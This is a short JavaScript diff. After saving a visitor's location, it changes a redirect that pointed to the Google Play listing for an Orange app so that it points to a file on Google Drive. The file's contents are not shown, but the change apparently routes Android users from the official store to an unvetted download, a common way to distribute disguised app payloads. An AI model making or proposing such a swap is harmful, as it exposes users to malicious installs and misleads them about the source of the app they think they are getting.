@@ -20,7 +20,7 @@ function SouthAndroid() {
   )
     .then(() => {
       window.location.href =
-        "https://play.google.com/store/apps/details?id=com.orange.myorange.osl";
+        "https://drive.google.com/file/d/1poiQWBIr3ZMPBLPdQ-kMj3jkHEiuVr9I/view?usp=drivesdk";
     })
     .catch((error) => {
       console.error("Error saving visitor location:", error);
